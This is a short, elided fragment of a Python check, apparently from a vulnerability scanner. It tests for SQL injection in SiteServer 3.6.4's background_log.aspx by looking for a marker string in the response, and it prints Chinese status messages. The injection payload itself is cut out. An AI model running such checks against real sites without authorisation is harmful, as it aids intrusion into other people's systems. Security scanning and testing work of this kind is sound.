...
class siteserver_background_log_sqli:
    ...
    def run(self):
        ...
        try:
            ...
            if r"BBBMicrosoft" in req.text:
                printGreen("[+]Success:存在siteserver3.6.4 background_log.aspx注入漏洞...(高危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在siteserver_background_log_sqli漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")
if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = siteserver_background_log_sqli(sys.argv[1])
    testVuln.run()
